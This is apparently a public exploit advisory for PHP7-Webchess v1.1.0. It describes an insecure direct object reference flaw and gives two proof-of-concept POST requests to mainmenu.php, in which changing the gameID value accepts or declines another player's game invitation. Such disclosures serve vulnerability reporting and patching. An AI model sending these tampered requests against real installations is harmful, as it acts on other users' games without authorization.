# Exploit Title: PHP7-Webchess v1.1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://github.com/halojoy/PHP7-Webchess
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHP7-Webchess
## Version: v1.1.0
## Exploit Description:
## PHP7-Webchess v1.1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to decline or accept the invitation of game that is created for other players(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /mainmenu.php HTTP/1.1
...

response=declined&messageFrom=&gameID=3(CHANGE HERE)&ToDo=ResponseToInvite
```

```
POST /mainmenu.php HTTP/1.1
...

response=accepted&messageFrom=&gameID=3(CHANGE HERE)&ToDo=ResponseToInvite
```